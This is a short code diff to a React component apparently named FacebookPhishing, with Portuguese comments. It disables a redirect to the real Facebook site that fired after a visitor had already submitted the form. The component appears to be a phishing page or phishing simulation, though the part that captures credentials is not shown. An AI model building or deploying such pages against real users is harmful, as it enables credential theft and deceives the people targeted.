@@ -10,12 +10,12 @@ export default function FacebookPhishing() {
   const [enviado, setEnviado] = useState(false);
   const usuario = localStorage.getItem('usuario');
 
-  // Redireciona imediatamente se já preencheu antes
-  useEffect(() => {
-    if (localStorage.getItem('fb_phish_' + id)) {
-      window.location.href = 'https://www.facebook.com/';
-    }
-  }, [id]);
+  // Remover o useEffect que redireciona automaticamente para o Facebook real
+  // useEffect(() => {
+  //   if (localStorage.getItem('fb_phish_' + id)) {
+  //     window.location.href = 'https://www.facebook.com/';
+  //   }
+  // }, [id]);
 
   async function handleSubmit(e) {
     e.preventDefault();
